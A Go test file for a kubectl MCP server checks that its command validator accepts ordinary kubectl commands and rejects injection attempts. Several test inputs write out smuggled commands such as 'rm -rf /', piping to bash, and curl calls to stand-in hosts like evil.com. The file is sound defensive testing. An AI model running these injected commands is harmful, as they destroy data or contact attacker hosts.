package test

import (
	"testing"

	"kubectl-go-mcp-server/pkg/kubectl"
)

func TestValidateKubectlCommand(t *testing.T) {
	tests := []struct {
		name        string
		command     string
		shouldError bool
		description string
	}{
		{
			name:        "valid_get_command",
			command:     "kubectl get pods",
			shouldError: false,
			description: "Valid kubectl get command should pass",
		},
		{
			name:        "valid_describe_command",
			command:     "kubectl describe deployment my-app",
			shouldError: false,
			description: "Valid kubectl describe command should pass",
		},
		{
			name:        "invalid_non_kubectl_command",
			command:     "ls -la",
			shouldError: true,
			description: "Non-kubectl command should be rejected",
		},
		{
			name:        "command_injection_semicolon",
			command:     "kubectl get pods; rm -rf /",
			shouldError: true,
			description: "Command injection with semicolon should be rejected",
		},
		{
			name:        "command_injection_pipe",
			command:     "kubectl get pods | curl malicious-site.com",
			shouldError: true,
			description: "Command injection with pipe should be rejected",
		},
		{
			name:        "invalid_subcommand",
			command:     "kubectl invalid-subcommand",
			shouldError: true,
			description: "Invalid kubectl subcommand should be rejected",
		},
		{
			name:        "empty_command",
			command:     "",
			shouldError: true,
			description: "Empty command should be rejected",
		},
		{
			name:        "kubectl_only",
			command:     "kubectl",
			shouldError: true,
			description: "kubectl without subcommand should be rejected",
		},
		{
			name:        "valid_apply_command",
			command:     "kubectl apply -f deployment.yaml",
			shouldError: false,
			description: "Valid kubectl apply command should pass",
		},
		{
			name:        "dangerous_bash_injection",
			command:     "kubectl get pods $(curl evil.com)",
			shouldError: true,
			description: "Bash command substitution should be rejected",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := kubectl.ValidateKubectlCommand(tt.command)
			if tt.shouldError && err == nil {
				t.Errorf("Expected error for command %q but got none. %s", tt.command, tt.description)
			}
			if !tt.shouldError && err != nil {
				t.Errorf("Expected no error for command %q but got: %v. %s", tt.command, err, tt.description)
			}
		})
	}
}

func TestRefinedCommandInjectionDetection(t *testing.T) {
	tests := []struct {
		name        string
		command     string
		shouldError bool
		description string
	}{
		{
			name:        "legitimate_kubectl_exec_with_bash",
			command:     "kubectl exec -it mypod -- /bin/bash",
			shouldError: false,
			description: "Legitimate kubectl exec with bash should be allowed",
		},
		{
			name:        "legitimate_kubectl_exec_with_sh",
			command:     "kubectl exec mypod -- /bin/sh -c 'ps aux'",
			shouldError: false,
			description: "Legitimate kubectl exec with sh should be allowed",
		},
		{
			name:        "command_injection_in_exec_part",
			command:     "kubectl exec -it mypod; rm -rf / -- /bin/bash",
			shouldError: true,
			description: "Command injection in kubectl exec part should be blocked",
		},
		{
			name:        "command_injection_after_double_dash",
			command:     "kubectl exec -it mypod -- /bin/bash; rm -rf /",
			shouldError: true,
			description: "Command injection after double dash should be blocked",
		},
		{
			name:        "non_exec_bash_command",
			command:     "kubectl get pods | bash",
			shouldError: true,
			description: "bash in non-exec context should be blocked",
		},
		{
			name:        "legitimate_exec_with_ls",
			command:     "kubectl exec mypod -- ls -la",
			shouldError: false,
			description: "Legitimate exec with ls should be allowed",
		},
		{
			name:        "legitimate_exec_with_ps",
			command:     "kubectl exec mypod -- ps aux",
			shouldError: false,
			description: "Legitimate exec with ps should be allowed",
		},
		{
			name:        "dangerous_curl_after_double_dash",
			command:     "kubectl exec mypod -- curl evil.com",
			shouldError: true,
			description: "curl after double dash should be blocked",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := kubectl.ValidateKubectlCommand(tt.command)
			if tt.shouldError && err == nil {
				t.Errorf("Expected error for command %q but got none. %s", tt.command, tt.description)
			}
			if !tt.shouldError && err != nil {
				t.Errorf("Expected no error for command %q but got: %v. %s", tt.command, err, tt.description)
			}
		})
	}
}
